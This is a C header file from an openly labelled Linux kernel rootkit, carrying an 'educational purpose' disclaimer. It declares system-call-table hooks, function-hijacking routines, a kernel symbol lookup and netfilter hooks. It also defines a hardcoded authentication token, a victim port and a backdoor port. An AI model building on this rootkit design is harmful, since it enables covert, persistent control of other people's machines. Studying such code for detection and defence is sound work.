/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */

#ifndef _COMMON_H_
#define _COMMON_H_

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#include <generated/autoconf.h>
#else
#include <linux/autoconf.h>
#endif


#define AUTH_TOKEN 0x12345678 

#ifndef NIPQUAD
# define NIPQUAD(addr) \
    ((unsigned char *)&addr)[0], \
    ((unsigned char *)&addr)[1], \
    ((unsigned char *)&addr)[2], \
    ((unsigned char *)&addr)[3]
#endif

#ifndef NIPQUAD_FMT
# define NIPQUAD_FMT "%u.%u.%u.%u"
#endif


#define __DEBUG__ 0
#if __DEBUG__
# define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif

#define __DEBUG_NF__ 0
#if __DEBUG_NF__
# define DEBUG_NF(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_NF(fmt, ...)
#endif

extern unsigned long *sys_call_table;

char *strnstr(const char *haystack, const char *needle, size_t n);
void *search_linear(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);

void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name);
#endif


#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif

#define VICTIM_PORT 80
#define BACKDOOR_PORT 8000
extern void nf_hook_init(void);
extern void nf_hook_cleanup(void);

#endif
